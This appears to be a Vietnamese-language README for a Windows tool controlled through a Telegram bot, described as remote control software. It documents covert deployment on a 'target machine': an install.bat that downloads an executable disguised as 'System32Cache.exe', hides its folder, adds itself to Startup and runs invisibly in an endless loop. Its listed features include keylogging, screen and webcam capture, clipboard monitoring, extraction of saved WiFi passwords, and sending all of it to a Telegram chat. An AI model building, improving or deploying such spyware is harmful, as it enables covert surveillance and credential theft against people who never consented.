# 🖥️ Remote Control Application

Ứng dụng điều khiển từ xa qua Telegram - Tự động quay màn hình, ghi phím, và gửi dữ liệu.

## 🚀 Cài đặt nhanh

### ⭐ Phương pháp 1: Sử dụng file .EXE (KHUYẾN NGHỊ - Không cần Python!)

**⚠️ QUAN TRỌNG:** File `.exe` đã chứa TẤT CẢ thư viện bên trong, máy đích **KHÔNG CẦN** Python hay bất kỳ thư viện nào!

1. **Tải file `install.bat`** từ GitHub:
   - Vào: https://github.com/truongxoantit/TLe1
   - Click vào file `install.bat` (hoặc `INSTALL_EXE.bat`)
   - Click nút **"Raw"** (góc phải trên)
   - Click chuột phải → **"Save as"** → Lưu với tên `install.bat`

2. **Chạy file `install.bat`** (Click đúp hoặc chuột phải → Run as Administrator)

**XONG!** Ứng dụng sẽ tự động:
- ✅ Tải file .exe từ GitHub (đã chứa tất cả thư viện)
- ✅ Chạy ngay lập tức (KHÔNG cần cài Python hay thư viện!)
- ✅ Ẩn thư mục và file
- ✅ Thêm vào Windows Startup
- ✅ Chạy hoàn toàn ẩn với vòng lặp vô hạn

**Lưu ý:** File .exe cần được build trước (xem [HUONG_DAN_BUILD_EXE.md](HUONG_DAN_BUILD_EXE.md))

## 📋 Tính năng

Xem danh sách đầy đủ: [CHUC_NANG.md](CHUC_NANG.md)

**Tính năng chính:**
- 🎥 **Quay màn hình**: Tự động quay 20 giây, gửi mỗi 20 giây
- ⌨️ **Keylogger**: Ghi lại tất cả phím bấm, gửi kèm video
- 📸 **Screenshot**: Chụp ảnh màn hình định kỳ
- 📋 **Clipboard**: Theo dõi clipboard tự động
- 📁 **File Transfer**: Gửi/nhận file qua Telegram
- 🎮 **Remote Control**: Điều khiển từ xa qua Telegram Bot
- 🖥️ **System Info**: Thu thập thông tin hệ thống
- 📶 **WiFi Extractor**: Lấy mật khẩu WiFi đã lưu (mỗi 1 giờ)
- 📹 **Webcam Capture**: Chụp ảnh từ webcam định kỳ (mỗi 30 phút)
- 🔌 **USB Monitor**: Theo dõi thiết bị USB mới (mỗi 1 phút)
- 🔒 **Stealth Mode**: Chạy hoàn toàn ẩn, tự động khởi động
- 🔄 **Auto Update**: Tự động cập nhật từ GitHub
- ⚡ **Performance Optimizer**: Tối ưu hiệu năng cho máy yếu

## ⚙️ Cấu hình

Sửa file `config.py`:
- `TELEGRAM_BOT_TOKEN`: Token bot Telegram
- `TELEGRAM_CHAT_ID`: ID chat để nhận dữ liệu

## 🛑 Dừng ứng dụng

Nhấn: **Ctrl + Shift + Alt + P**

## 📁 Cấu trúc file

```
main/
├── install.bat              ← File cài đặt chính (chạy trên máy đích) ⭐
├── INSTALL_EXE.bat          ← File cài đặt .EXE (được gọi bởi install.bat)
├── BUILD_EXE.bat            ← Build file .exe (chạy trên máy phát triển)
├── INSTALL_LIBRARIES.bat    ← Cài đặt thư viện (chạy trên máy phát triển)
├── dist/
│   └── System32Cache.exe    ← File .exe (sau khi build, upload lên GitHub)
├── main_stealth.py          ← File chính Python (cần để build)
├── config.py                ← Cấu hình (cần để build)
├── requirements.txt         ← Thư viện Python (cần để build)
├── CHUC_NANG.md             ← Danh sách đầy đủ các chức năng
└── ... (các module Python khác - cần để build)
```

## ⚠️ Lưu ý

- ✅ **KHÔNG CẦN** Python trên máy đích
- ✅ **KHÔNG CẦN** cài thư viện gì cả
- ✅ Chỉ cần file .exe (đã chứa tất cả thư viện)
- ✅ Ứng dụng tự động chạy khi khởi động Windows
- ✅ Chạy hoàn toàn ẩn, không có cửa sổ
- 📦 Repo GitHub: **TLe1** (Private)

## 📦 Build file .EXE

Xem hướng dẫn chi tiết: [HUONG_DAN_BUILD_EXE.md](HUONG_DAN_BUILD_EXE.md)

**Tóm tắt:**
- Build trên máy phát triển (cần Python): `BUILD_EXE.bat`
- Upload file .exe lên GitHub
- Máy đích chỉ cần chạy `INSTALL_EXE.bat` (KHÔNG cần Python!)

## 🔧 Kiểm tra và Debug

### Xem log lỗi:
- `%APPDATA%\Microsoft\Windows\System32Cache\temp\error.log`
- `%APPDATA%\Microsoft\Windows\System32Cache\temp\telegram_error.log`

### Kiểm tra ứng dụng đang chạy:
- Mở Task Manager (Ctrl + Shift + Esc)
- Tìm process `System32Cache.exe`

## 📖 Hướng dẫn chi tiết

1. **Tạo Bot Telegram:**
   - Tìm @BotFather trên Telegram
   - Gửi `/newbot` và làm theo hướng dẫn
   - Lưu lại Bot Token

2. **Lấy Chat ID:**
   - Tìm @userinfobot trên Telegram
   - Gửi `/start` để lấy Chat ID

3. **Cấu hình:**
   - Sửa file `config.py`
   - Điền `TELEGRAM_BOT_TOKEN` và `TELEGRAM_CHAT_ID`

4. **Build file .exe:**
   - Chạy `BUILD_EXE.bat` trên máy phát triển (cần Python)
   - File .exe sẽ được tạo tại `dist\System32Cache.exe`
   - Xem chi tiết: [HUONG_DAN_BUILD_EXE.md](HUONG_DAN_BUILD_EXE.md)

5. **Upload file .exe lên GitHub:**
   - Upload file `dist\System32Cache.exe` lên GitHub
   - Đặt trong thư mục `dist/` hoặc root của repo

6. **Cài đặt trên máy đích:**
   - Tải `install.bat` từ GitHub
   - Chạy với quyền Administrator
   - Ứng dụng sẽ tự động:
     - Tải file .exe từ GitHub
     - Cài đặt vào thư mục ẩn
     - Thêm vào Windows Startup
     - **Khởi động ngay lập tức** (KHÔNG cần Python!)
